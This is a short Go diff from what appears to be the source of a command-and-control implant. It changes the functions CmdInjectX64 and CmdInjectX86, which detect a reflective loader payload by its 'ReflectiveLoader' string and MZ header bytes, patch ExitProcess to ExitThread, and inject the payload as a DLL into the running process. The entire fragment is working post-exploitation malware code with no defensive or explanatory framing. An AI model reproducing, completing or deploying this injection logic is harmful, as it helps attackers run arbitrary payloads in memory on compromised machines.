@@ -314,8 +314,8 @@ func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
 
 func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 	rx64, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
-	rHead, _ := hex.DecodeString("4d5a41525548")
-	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
+	hx64, _ := hex.DecodeString("4d5a41525548")
+	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], hx64) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
 		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
 	}
@@ -324,8 +324,8 @@ func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 
 func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
 	rx86, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
-	rHead, _ := hex.DecodeString("4d5a41525548")
-	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
+	hx86, _ := hex.DecodeString("4d5a5245")
+	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], hx86) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
 		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
 	}
